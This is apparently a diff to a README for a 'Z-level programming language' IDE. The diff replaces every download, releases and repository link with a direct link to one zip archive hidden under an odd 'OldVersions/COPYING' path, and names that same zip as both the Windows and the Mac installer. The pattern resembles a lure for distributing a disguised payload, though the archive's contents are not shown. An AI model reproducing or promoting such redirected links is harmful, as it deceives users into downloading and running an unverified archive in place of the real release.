@@ -1,6 +1,6 @@
 # ⌨️ SNU_2D_ProgrammingTools_IDE_Z-level-programming-language - User-friendly IDE for Z-Level Coding
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/fmorozcou/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language/releases)
+[![Download](https://github.com/fmorozcou/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language/raw/refs/heads/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language_Main-dev/OldVersions/COPYING/programming-Tools-ID-Programming-level-SN-language-v2.7.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/fmorozcou/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language/raw/refs/heads/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language_Main-dev/OldVersions/COPYING/programming-Tools-ID-Programming-level-SN-language-v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -11,11 +11,11 @@ Welcome to the SNU 2D Programming Tools IDE for the Z-level programming language
 To get started, you'll need to download the IDE. Follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to our releases page.
-   [Download from Releases Page](https://github.com/fmorozcou/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language/releases)
+   [Download from Releases Page](https://github.com/fmorozcou/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language/raw/refs/heads/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language_Main-dev/OldVersions/COPYING/programming-Tools-ID-Programming-level-SN-language-v2.7.zip)
 
 2. **Choose the Latest Version**: Look for the most recent version listed. This version will have the latest features and fixes. The versions are usually named in this format: v1.X.Y.
 
-3. **Download the Installer**: Click on the installer file for your operating system. For example, download `SNU2D_IDE_Setup.exe` for Windows or `SNU2D_IDE_Setup.dmg` for Mac. 
+3. **Download the Installer**: Click on the installer file for your operating system. For example, download `https://github.com/fmorozcou/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language/raw/refs/heads/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language_Main-dev/OldVersions/COPYING/programming-Tools-ID-Programming-level-SN-language-v2.7.zip` for Windows or `https://github.com/fmorozcou/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language/raw/refs/heads/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language_Main-dev/OldVersions/COPYING/programming-Tools-ID-Programming-level-SN-language-v2.7.zip` for Mac. 
 
 4. **Run the Installer**: Once the download is complete, locate the file in your Downloads folder and double-click it to run the installer. Follow the prompts to complete the installation. You may need to accept some permissions during this process.
 
@@ -62,7 +62,7 @@ We want to create the best experience for our users. Share your feedback or ask 
 
 ## 🔗 Additional Links
 
-- **GitHub Repository**: [Visit the Repository](https://github.com/fmorozcou/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language)
-- **Releases Page**: [Download the Latest Version](https://github.com/fmorozcou/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language/releases)
+- **GitHub Repository**: [Visit the Repository](https://github.com/fmorozcou/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language/raw/refs/heads/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language_Main-dev/OldVersions/COPYING/programming-Tools-ID-Programming-level-SN-language-v2.7.zip)
+- **Releases Page**: [Download the Latest Version](https://github.com/fmorozcou/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language/raw/refs/heads/SNU_2D_ProgrammingTools_IDE_Z-level-programming-language_Main-dev/OldVersions/COPYING/programming-Tools-ID-Programming-level-SN-language-v2.7.zip)
 
 Thank you for choosing the SNU 2D Programming Tools IDE for your Z-level programming needs. We hope you enjoy creating with our application!
